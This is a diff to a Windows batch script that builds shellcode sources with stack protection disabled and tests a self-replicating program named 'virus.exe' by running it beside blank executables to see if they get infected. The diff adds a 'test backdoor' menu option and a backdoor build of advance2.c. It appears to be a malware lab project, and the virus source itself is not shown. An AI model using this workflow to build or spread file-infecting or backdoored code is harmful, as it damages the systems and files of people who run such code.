@@ -13,6 +13,7 @@ echo "3: build tools"
 echo "4: complie shellcode"
 echo "5: test junior"
 echo "6: test advance"
+echo "7: test backdoor"
 echo "9: quit"
 echo "others: help"
 
@@ -31,6 +32,8 @@ if %opt% equ 1 (
     goto test_junior
 ) else if %opt% equ 6 (
     goto test_advance2
+) else if %opt% equ 7 (
+    goto test_backdoor
 ) else if %opt% equ 9 (
     goto quit
 ) else (
@@ -63,6 +66,7 @@ cl /c /GS- /Ob1 junior.c
 cl /c /GS- /Ob1 tiny.c
 cl /c /GS- /Ob1 advance.c
 cl /c /GS- /Ob1 advance2.c
+cl /c /GS- /Ob1 /DCONFIG_BACKDOOR /Fobackdoor.obj advance2.c 
 goto interact
 
 :test_junior
@@ -90,6 +94,23 @@ dumpbin hello.exe
 goto interact
 
 :test_advance2
+if exist %test% rmdir /S /Q %test%
+mkdir %test%
+rem Advance2 can run itself
+cd %src%
+link /entry:ShellCode /subsystem:console advance2.obj
+copy advance2.exe %test%\virus.exe
+copy %root%\blank.exe.bak %test%\hello1.exe
+cd %test%
+.\virus.exe
+copy %root%\blank.exe.bak %test%\hello2.exe
+.\hello1.exe
+echo "Test string!" > %test%\copy_me.txt
+.\hello2.exe
+dumpbin hello2.exe
+goto interact
+
+:test_backdoor
 if exist %test% rmdir /S /Q %test%
 mkdir %test%
 rem Advance2 can run itself
